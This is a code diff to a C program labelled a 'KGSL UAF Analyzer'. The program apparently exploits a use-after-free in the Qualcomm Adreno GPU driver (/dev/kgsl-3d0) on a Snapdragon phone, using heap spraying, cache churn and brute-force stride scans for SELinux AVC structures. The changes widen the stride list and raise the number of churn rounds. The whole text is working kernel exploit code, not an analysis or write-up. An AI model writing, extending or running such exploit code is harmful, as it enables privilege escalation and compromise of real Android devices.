@@ -424,7 +424,7 @@ static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
 
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] KGSL UAF Analyzer for Snapdragon 480 5G\n");
+    printf("[*] KGSL UAF Analyzer\n");
 
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
     if (kgsl_fd < 0) die("open kgsl");
@@ -503,18 +503,23 @@ int main(int argc, char **argv) {
     kill_spray_children();
     usleep(100000);
 
-    printf("[*] Running heavy churn to populate AVC cache\n");
+    printf("[*] Running heavy churn to populate AVC cache (20 rounds)\n");
     churn_build();
-    for (int c = 0; c < 5; c++) {
+    for (int c = 0; c < 20; c++) {
         churn_round();
-        printf("[CHURN] round %d done\n", c+1);
+        if ((c+1) % 5 == 0) printf("[CHURN] round %d done\n", c+1);
     }
 
-    int strides[] = {64, 72, 80, 96, 48, 56};
+    int strides[] = {
+        16, 20, 24, 28, 32, 36, 40, 44, 48, 52, 56, 60,
+        64, 68, 72, 76, 80, 84, 88, 92, 96, 100, 104, 108,
+        112, 116, 120, 124, 128
+    };
+    int num_strides = sizeof(strides)/sizeof(strides[0]);
     int found = 0;
     int best_stride = 0;
-    printf("[AVC] Starting scan (brute-force stride)\n");
-    for (int si = 0; si < sizeof(strides)/sizeof(strides[0]); si++) {
+    printf("[AVC] Starting scan (brute-force stride, %d values)\n", num_strides);
+    for (int si = 0; si < num_strides; si++) {
         int s = strides[si];
         printf("[AVC] Scanning with stride=%d...\n", s);
         int n = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
@@ -534,7 +539,7 @@ int main(int argc, char **argv) {
         for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
             if (n_all < 4096) all_vas[n_all++] = va;
         }
-        for (int si = 0; si < sizeof(strides)/sizeof(strides[0]); si++) {
+        for (int si = 0; si < num_strides; si++) {
             int s = strides[si];
             printf("[AVC] Scanning entire range with stride=%d...\n", s);
             int n = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
